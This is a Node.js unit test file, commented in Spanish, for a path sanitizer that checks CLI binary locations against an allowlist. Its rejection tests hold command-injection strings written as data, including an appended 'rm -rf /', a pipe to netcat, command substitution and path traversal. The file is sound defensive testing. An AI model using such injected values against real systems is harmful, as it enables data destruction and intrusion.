'use strict'

const { test, describe } = require('node:test')
const assert = require('node:assert')
const os = require('os')
const path = require('path')
const { sanitizeCliBinaryPath } = require('../main/config-store')

describe('SEC-C2: sanitizeCliBinaryPath', () => {
  test('acepta /usr/local/bin/claude', () => {
    assert.equal(sanitizeCliBinaryPath('/usr/local/bin/claude'), '/usr/local/bin/claude')
  })

  test('acepta /opt/homebrew/bin/codex', () => {
    assert.equal(sanitizeCliBinaryPath('/opt/homebrew/bin/codex'), '/opt/homebrew/bin/codex')
  })

  test('acepta ~/.local/bin/whisper (expandido)', () => {
    const expanded = path.join(os.homedir(), '.local/bin/whisper')
    assert.equal(sanitizeCliBinaryPath('~/.local/bin/whisper'), expanded)
  })

  test('acepta ~/.nvm/versions/node/v20.18.0/bin/codex', () => {
    const expanded = path.join(os.homedir(), '.nvm/versions/node/v20.18.0/bin/codex')
    assert.equal(sanitizeCliBinaryPath('~/.nvm/versions/node/v20.18.0/bin/codex'), expanded)
  })

  test('acepta /usr/local/Cellar/claude/1.0/bin/claude', () => {
    assert.equal(
      sanitizeCliBinaryPath('/usr/local/Cellar/claude/1.0/bin/claude'),
      '/usr/local/Cellar/claude/1.0/bin/claude'
    )
  })

  test('vacío y no-string', () => {
    assert.equal(sanitizeCliBinaryPath(''), '')
    assert.equal(sanitizeCliBinaryPath(null), '')
    assert.equal(sanitizeCliBinaryPath(undefined), '')
    assert.equal(sanitizeCliBinaryPath(123), '')
  })

  test('rechaza paths fuera de allowlist: /tmp', () => {
    assert.equal(sanitizeCliBinaryPath('/tmp/evil-bin'), '')
  })

  test('rechaza /Users/x/Downloads/evil', () => {
    assert.equal(sanitizeCliBinaryPath('/Users/x/Downloads/evil'), '')
  })

  test('rechaza paths relativos', () => {
    assert.equal(sanitizeCliBinaryPath('./claude'), '')
    assert.equal(sanitizeCliBinaryPath('claude'), '')
  })

  test('rechaza traversal con ..', () => {
    assert.equal(sanitizeCliBinaryPath('/usr/local/bin/../../tmp/evil'), '')
  })

  test('rechaza shell metacharacters', () => {
    assert.equal(sanitizeCliBinaryPath('/usr/local/bin/claude; rm -rf /'), '')
    assert.equal(sanitizeCliBinaryPath('/usr/local/bin/claude && evil'), '')
    assert.equal(sanitizeCliBinaryPath('/usr/local/bin/claude | nc x.com'), '')
    assert.equal(sanitizeCliBinaryPath('/usr/local/bin/claude`evil`'), '')
    assert.equal(sanitizeCliBinaryPath('/usr/local/bin/$(evil)'), '')
    assert.equal(sanitizeCliBinaryPath('/usr/local/bin/c\nlaude'), '')
  })

  test('rechaza paths con quotes / wildcards', () => {
    assert.equal(sanitizeCliBinaryPath("/usr/local/bin/'evil'"), '')
    assert.equal(sanitizeCliBinaryPath('/usr/local/bin/*'), '')
  })

  test('trim espacios', () => {
    assert.equal(sanitizeCliBinaryPath('  /usr/local/bin/claude  '), '/usr/local/bin/claude')
  })

  test('regresión: bin en /opt/evilroot rechazado', () => {
    assert.equal(sanitizeCliBinaryPath('/opt/evilroot/payload'), '')
  })

  test('regresión: bin en ~/Desktop/foo rechazado', () => {
    assert.equal(sanitizeCliBinaryPath('~/Desktop/foo'), '')
  })
})
